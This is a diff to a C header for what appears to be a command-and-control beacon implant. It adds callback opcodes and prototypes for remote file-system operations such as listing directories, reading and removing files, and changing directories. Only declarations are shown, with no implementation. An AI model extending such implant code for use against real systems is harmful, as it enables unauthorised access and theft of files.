@@ -7,11 +7,21 @@
 #define MODE_CHECKIN_DATA 0x1000
 #define MODE_CHECKIN_NO_DATA 0x2000
 
+#define DATA_CMD_OUT 0x2000
+#define DO_CALLBACK 0x4000
+
 BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, LPCWSTR UriBuffer, DWORD dwSize);
 LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, DWORD *OpCode, LPCSTR SendBuffer, DWORD SendOpCode, DWORD SendBufferSize);
 
 LPVOID DieCleanly();
 LPVOID CheckIfDie(LPCWSTR *ReadBuffer);
+
+char* listdirs(LPCSTR szDir);
+char* readfile(char* szFile);
+char* makedirectory(char* szDirName);
+char* removefile(char* szFileName);
+char* getdir();
+char* changedir(char* Dir);
 
 LPVOID ReportExecutionFail();
 
